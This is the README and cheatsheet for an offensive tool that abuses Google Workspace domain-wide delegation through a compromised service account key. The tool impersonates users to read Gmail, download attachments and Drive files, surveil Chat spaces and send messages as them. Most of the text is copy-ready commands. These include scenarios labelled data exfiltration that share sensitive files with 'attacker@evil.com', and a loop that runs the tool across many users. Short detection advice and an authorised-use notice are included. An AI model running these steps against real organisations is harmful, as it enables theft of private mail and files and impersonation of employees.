# Delegate
Tool to perform GCP Domain Wide Delegation abuse and access Gmail and Drive data from a compromised Service Account with domain wide delegation permissions configured within Google Workspace.

- [Domain Wide Delegation article](https://medium.com/@lutzenfried/gcp-domain-wide-delegation-abuses-b82b8dd8cf15)

<img src="./Images/DomainWideDelegation_GCP.png" alt="gcpdelegation" width="800"/>

# 🔐 GCP Delegate Tool - Complete Cheatsheet

> **Domain-Wide Delegation Abuse Tool for Security Testing**  
> Version 3.0.0 | By @lutzenfried

---

## 📋 Table of Contents

- [Quick Start](#quick-start)
- [Gmail Module](#-gmail-module)
- [Drive Module](#-drive-module)
- [Chat Module](#-chat-module)
- [Common Scenarios](#-common-scenarios)

---

## 🚀 Quick Start

### Basic Syntax

```bash
python delegate.py -k <SERVICE_ACCOUNT_KEY> -i <EMAIL_TO_IMPERSONATE> -m <MODULE> -a <ACTION> [OPTIONS]
```

### Required Parameters

| Parameter | Short | Description |
|-----------|-------|-------------|
| `--key` | `-k` | Service account key JSON file path |
| `--impersonate` | `-i` | Email address to impersonate |
| `--module` | `-m` | Module: `gmail`, `drive`, `chat` |
| `--action` | `-a` | Action to perform (see module sections) |

---

## 📧 Gmail Module

### Available Actions

| Action | Description | Required Parameters |
|--------|-------------|-------------------|
| `list` | List emails (subject + sender) | None |
| `read` | Read full email contents | None |
| `listFolders` | List all Gmail labels/folders | None |
| `listFromLabel` | List emails from specific label | `--label` |
| `readFromLabel` | Read emails from specific label | `--label` |
| `send` | Send an email | `--recipient`, `--subject`, `--content` |
| `downloadAttachments` | Download all attachments | None |

### Commands

#### List Emails
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a list
```

#### Read Email Contents
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a read
```

#### List Gmail Folders/Labels
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFolders
```

#### List Emails from Specific Label
```bash
# INBOX
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "INBOX"

# SENT
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "SENT"

# IMPORTANT
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "IMPORTANT"
```

#### Read Emails from Label
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a readFromLabel --label "INBOX"
```

#### Send Email
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a send \
  --recipient "target@example.com" \
  --subject "Important Update" \
  --content "This is the email body text"
```

#### Download All Attachments
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a downloadAttachments
```

### Gmail Label Examples

Common Gmail labels:
- `INBOX` - Inbox emails
- `SENT` - Sent emails
- `DRAFT` - Draft emails
- `TRASH` - Trash
- `SPAM` - Spam folder
- `IMPORTANT` - Important emails
- `STARRED` - Starred emails
- `UNREAD` - Unread emails

---

## 💾 Drive Module

### Available Actions

| Action | Description | Required Parameters |
|--------|-------------|-------------------|
| `listFiles` | List all files and folders | None |
| `listFolders` | List folders with contents | None |
| `download` | Download a specific file | `--filename` |
| `upload` | Upload a file to Drive | `--filepath`, `--filename`, `[--foldername]` |
| `modifyPermissions` | Share file with external account | `--filename`, `--external-account` |

### Commands

#### List All Files
```bash
python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFiles
```

#### List Folders with Contents
```bash
python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFolders
```

#### Download File
```bash
python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
  --filename "Confidential_Report.xlsx"
```

**Supported File Types:**
- Google Sheets → Exports as `.xlsx`
- Google Docs → Exports as `.docx`
- Google Slides → Exports as `.pptx`
- Binary files → Downloads as-is

#### Upload File
```bash
# Upload to root
python delegate.py -k sa_key.json -i victim@company.com -m drive -a upload \
  --filepath "/path/to/local/file.pdf" \
  --filename "uploaded_file.pdf"

# Upload to specific folder
python delegate.py -k sa_key.json -i victim@company.com -m drive -a upload \
  --filepath "/path/to/local/file.pdf" \
  --filename "uploaded_file.pdf" \
  --foldername "Documents"
```

#### Share File with External Account
```bash
python delegate.py -k sa_key.json -i victim@company.com -m drive -a modifyPermissions \
  --filename "Sensitive_Data.xlsx" \
  --external-account "attacker@evil.com"
```

**Note:** This grants write access and sends a notification email.

---

## 💬 Chat Module

### Available Actions

| Action | Description | Required Parameters |
|--------|-------------|-------------------|
| `listSpaces` | List all accessible Chat spaces | None |
| `listMessages` | List messages in a space | `--space-id`, `[--max-results]` |
| `readMessages` | Read full message content | `--space-id`, `[--max-results]` |
| `sendMessage` | Send a message to space | `--space-id`, `--text`, `[--thread-id]` |
| `sendWithAttachment` | Send message with file | `--space-id`, `--text`, `--filepath`, `[--thread-id]` |
| `downloadAttachments` | Download all attachments | `--space-id`, `[--max-results]` |
| `getMembers` | List space members | `--space-id` |
| `createSpace` | Create a new Chat space | `--summary`, `[--description]`, `[--threaded]` |

### Commands

#### List All Chat Spaces
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a listSpaces
```

#### List Messages in Space
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a listMessages \
  --space-id "AAAAAbCdEfG" \
  --max-results 100
```

#### Read Full Message Content
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a readMessages \
  --space-id "AAAAAbCdEfG" \
  --max-results 50
```

#### Send Message
```bash
# Simple message
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendMessage \
  --space-id "AAAAAbCdEfG" \
  --text "Hello team!"

# Reply to thread
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendMessage \
  --space-id "AAAAAbCdEfG" \
  --text "Replying to this thread" \
  --thread-id "xyz123abc"
```

#### Send Message with Attachment
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendWithAttachment \
  --space-id "AAAAAbCdEfG" \
  --text "Please review this document" \
  --filepath "/path/to/document.pdf"

# With thread
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendWithAttachment \
  --space-id "AAAAAbCdEfG" \
  --text "Updated version attached" \
  --filepath "/path/to/file.xlsx" \
  --thread-id "xyz123abc"
```

#### Download Attachments
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a downloadAttachments \
  --space-id "AAAAAbCdEfG" \
  --max-results 100
```

**Note:** Creates a `chat_attachments_<SPACE_ID>` directory with all downloaded files.

#### Get Space Members
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a getMembers \
  --space-id "AAAAAbCdEfG"
```

#### Create New Space
```bash
# Basic space
python delegate.py -k sa_key.json -i victim@company.com -m chat -a createSpace \
  --summary "Project Alpha"

# Space with description and threading
python delegate.py -k sa_key.json -i victim@company.com -m chat -a createSpace \
  --summary "Security Team" \
  --description "Internal security discussions" \
  --threaded
```

---

## 🎯 Common Scenarios

### Scenario 1: Complete Email Reconnaissance

```bash
# Step 1: List all folders
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a listFolders

# Step 2: List emails from INBOX
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a listFromLabel --label "INBOX"

# Step 3: Read email contents
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a read

# Step 4: Download all attachments
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a downloadAttachments
```

### Scenario 2: Drive Data Exfiltration

```bash
# Step 1: List all files
python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFolders

# Step 2: Download sensitive files
python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
  --filename "Q4_Financial_Report.xlsx"

python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
  --filename "Customer_Database.csv"

# Step 3: Share with external account
python delegate.py -k sa_key.json -i victim@company.com -m drive -a modifyPermissions \
  --filename "Q4_Financial_Report.xlsx" \
  --external-account "attacker@gmail.com"
```

### Scenario 4: Chat Space Surveillance

```bash
# Step 1: List all spaces
python delegate.py -k sa_key.json -i user@company.com -m chat -a listSpaces

# Step 2: Get space members
python delegate.py -k sa_key.json -i user@company.com -m chat -a getMembers \
  --space-id "SPACE_ID_HERE"

# Step 3: Read messages
python delegate.py -k sa_key.json -i user@company.com -m chat -a readMessages \
  --space-id "SPACE_ID_HERE" \
  --max-results 200

# Step 4: Download attachments
python delegate.py -k sa_key.json -i user@company.com -m chat -a downloadAttachments \
  --space-id "SPACE_ID_HERE"
```

---

## 🔧 PowerShell Shortcuts

### Batch Operations

```powershell
# Test multiple users
$users = @("user1@company.com", "user2@company.com", "user3@company.com")

foreach ($user in $users) {
    Write-Host "[*] Testing: $user" -ForegroundColor Cyan
    python .\delegate.py -k $KEY -i $user -m gmail -a listFolders
}
```

---

## 🛡️ Security Notes

### Domain-Wide Delegation Setup

For this tool to work, the service account must have domain-wide delegation configured in **Google Workspace Admin Console**:

1. Go to **Security** → **API Controls** → **Domain-wide Delegation**
2. Add the service account's **Client ID**
3. Authorize these OAuth scopes:
   ```
   https://mail.google.com/
   https://www.googleapis.com/auth/drive
   https://www.googleapis.com/auth/chat.spaces
   ```

### Detection & Prevention

**Detection:**
- Monitor Google Workspace audit logs for service account activity
- Alert on API calls from unusual IPs
- Track file sharing to external domains
- Monitor bulk downloads

**Prevention:**
- Limit domain-wide delegation scopes
- Regularly audit service account permissions
- Implement IP restrictions
- Enable advanced protection for high-risk users
- Use context-aware access policies

---

## ⚠️ Legal Notice

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for:
- ✅ Authorized penetration testing
- ✅ Security research in lab environments
- ✅ Red team exercises with permission
- ✅ Security awareness training

**Never use without explicit written authorization!**

Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar laws worldwide

---

## 📚 Additional Resources

- **GitHub**: https://github.com/lutzenfried/Delegate
- **Blog Post**: https://medium.com/@lutzenfried/gcp-domain-wide-delegation-abuses
- **Google Docs**: https://developers.google.com/identity/protocols/oauth2/service-account

---

## 🎓 Quick Reference Card

| Module | Most Common Actions |
|--------|-------------------|
| **Gmail** | `list`, `read`, `downloadAttachments` |
| **Drive** | `listFolders`, `download`, `modifyPermissions` |
| **Chat** | `listSpaces`, `readMessages`, `downloadAttachments` |

---

**Version 3.0.0** | Last Updated: 2025-10-16 | Author: @lutzenfried